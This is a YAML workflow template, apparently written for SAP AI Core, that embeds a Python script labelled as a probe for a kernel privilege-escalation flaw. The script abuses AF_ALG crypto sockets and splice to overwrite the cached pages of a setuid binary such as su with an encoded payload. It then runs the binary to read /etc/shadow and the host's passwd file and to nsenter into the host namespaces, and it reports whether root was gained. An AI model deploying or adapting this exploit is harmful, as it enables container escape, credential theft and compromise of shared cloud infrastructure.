apiVersion: ai.sap.com/v1alpha1
kind: WorkflowTemplate
metadata:
  name: cve31431-wf
  labels:
    scenarios.ai.sap.com/id: "cve31431-wf"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "cve31431-wf"
    executables.ai.sap.com/name: "cve31431-wf"
    executables.ai.sap.com/description: "CVE-2026-31431 workflow LPE probe"
spec:
  imagePullSecrets: []
  entrypoint: main
  templates:
  - name: main
    steps:
    - - name: exploit
        template: exploit-step
  - name: exploit-step
    container:
      image: python:3.11
      command: [python3, -c]
      args:
      - |
        import os, sys, socket, struct, subprocess, zlib

        def r(k, v): print(f"[WFTRAIN] {k}: {str(v)[:4000]}", flush=True)

        r("PHASE", "1-SECURITY-CONTEXT")
        r("KERNEL", os.popen("uname -r").read().strip())
        r("HOSTNAME", os.uname().nodename)
        r("UID", f"uid={os.getuid()} gid={os.getgid()} euid={os.geteuid()}")

        status = open("/proc/self/status").read()
        for line in status.split("\n"):
            k2 = line.split(":")[0].strip()
            v2 = line.split(":", 1)[1].strip() if ":" in line else ""
            if k2 in ("NoNewPrivs","Seccomp") or k2.startswith("Cap"):
                r(k2, v2)

        no_new_privs = int([l for l in status.split("\n") if "NoNewPrivs" in l][0].split(":")[1])
        r("NONEWPRIVS_VALUE", str(no_new_privs))
        r("EXPLOIT_VIABLE", str(no_new_privs == 0))

        # All visible PIDs and their NNP
        for pid in sorted(os.listdir("/proc")):
            if not pid.isdigit(): continue
            try:
                st = open(f"/proc/{pid}/status").read()
                nnp = [l for l in st.split("\n") if "NoNewPrivs" in l]
                uid = [l for l in st.split("\n") if l.startswith("Uid")]
                name = [l for l in st.split("\n") if l.startswith("Name")]
                r(f"PID_{pid}", f"name={name[0].split(':')[1].strip() if name else '?'} uid={uid[0].split(':')[1].strip() if uid else '?'} nnp={nnp[0].split(':')[1].strip() if nnp else '?'}")
            except: pass

        r("PHASE", "2-EXPLOIT" if no_new_privs == 0 else "2-SKIP (NoNewPrivs=1)")

        if no_new_privs == 0:
            AF_ALG, SOCK_SEQPACKET = 38, 5
            SOL_ALG = 279
            alg_name = "authencesn(hmac(sha256),cbc(aes))"
            key = bytes.fromhex('0800010000000010' + '0'*64)

            def write4(file_fd, t, payload4):
                a = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
                a.bind(("aead", alg_name))
                a.setsockopt(SOL_ALG, 1, key)
                a.setsockopt(SOL_ALG, 5, None, 4)
                u, _ = a.accept()
                null = b'\x00'
                o = t + 4
                u.sendmsg([b"A"*4 + payload4],
                          [(SOL_ALG, 3, null*4),(SOL_ALG, 2, b'\x10'+null*19),(SOL_ALG, 4, b'\x08'+null*3)], 32768)
                rp, wp = os.pipe()
                os.splice(file_fd, wp, o, offset_src=0)
                os.splice(rp, u.fileno(), o)
                try: u.recv(8 + t)
                except: pass
                u.close(); a.close()
                os.close(rp); os.close(wp)

            target = None
            for c in ["/usr/bin/su","/bin/su","/usr/bin/newgrp","/usr/bin/passwd","/usr/bin/gpasswd"]:
                if os.path.exists(c) and os.stat(c).st_mode & 0o4000:
                    target = c; break
            r("TARGET", str(target))

            if target:
                payload = zlib.decompress(bytes.fromhex(
                    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209"
                    "a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e"
                    "56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
                ))
                fd = os.open(target, os.O_RDONLY)
                i = 0
                while i < len(payload):
                    write4(fd, i, payload[i:i+4])
                    i += 4
                r("PAGE_CACHE_WRITE", "COMPLETE")

                proc = subprocess.Popen([target], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                out, err = proc.communicate(
                    b"id\nuname -r\nhostname\ncat /etc/shadow 2>&1\ncat /proc/1/root/etc/passwd 2>&1\nnsenter -t 1 -m -u -i -n -p -- id 2>&1\nexit\n",
                    timeout=30)
                r("SHELL_STDOUT", out.decode("utf-8","replace") or "(empty)")
                r("SHELL_STDERR", err.decode("utf-8","replace") or "(empty)")
                r("SHELL_RC", str(proc.returncode))

                if os.geteuid() == 0:
                    r("ROOT", "YES — PRIVILEGE ESCALATION CONFIRMED")
                else:
                    r("ROOT", f"NO — uid={os.getuid()}")

        r("DONE", "complete")
